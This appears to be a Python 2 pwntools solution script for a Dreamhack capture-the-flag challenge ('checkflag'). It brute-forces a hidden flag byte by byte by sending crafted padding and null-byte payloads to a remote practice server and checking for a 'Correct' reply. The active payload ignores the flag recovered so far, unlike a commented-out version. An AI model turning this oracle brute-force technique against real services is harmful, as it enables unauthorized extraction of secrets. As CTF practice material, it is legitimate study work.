from pwn import *
import string
import time


context.update(log_level='debug')
flag = ''
len_flag = 0x40 - 1
ascii_table = string.letters + string.digits + '!@#$%^&*()_+-={}[]:";\',./<>?'
for x in range(len_flag):
    flag_found = 0
    #for ch in ascii_table:
    for ch in range(0x10, 0xff):
        ch = chr(ch) 
        p = remote('host1.dreamhack.games', 15561)
        #p = process('checkflag')
        #raw_input('debug: ' + str(p.pid))
        '''
        x = ('x'*len_flag)[: -(len(flag) + 1)]
        brute = x + ch + flag + '\x00'
        overwrite = brute[:-(len(flag) + 2)]
        payload = brute + overwrite
        '''
        l_s = 0x40 - 1
        payload = 'x'*(l_s-1) + ch + '\x00' + 'x'*(l_s-1)
        log.info('payload: ' + payload)
        p.recv(9999)
        p.send(payload)
        if p.recvline().find('Correct') != -1:
            print 'Found part of flag : ' + ch
            #time.sleep(2)
            flag = ch + flag
            flag_found = 1
            raw_input('press any keys')
            p.close()
            break
        else:
            #print 'Failed : ' + ch
            #raw_input('press any keys')
            p.close()
    if flag_found == 0:
        break
print 'Flag is : ' + flag


